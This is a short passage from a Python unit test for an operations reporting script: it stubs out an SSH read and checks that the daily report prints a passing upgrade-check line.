    monkeypatch.setattr(ops_daily, "ssh_read", fresh)
    assert ops_daily.main(["report"]) == 0
    assert f"- PASS {ops_daily.UPGRADE_CHECK}: Result=success" in capsys.readouterr().out
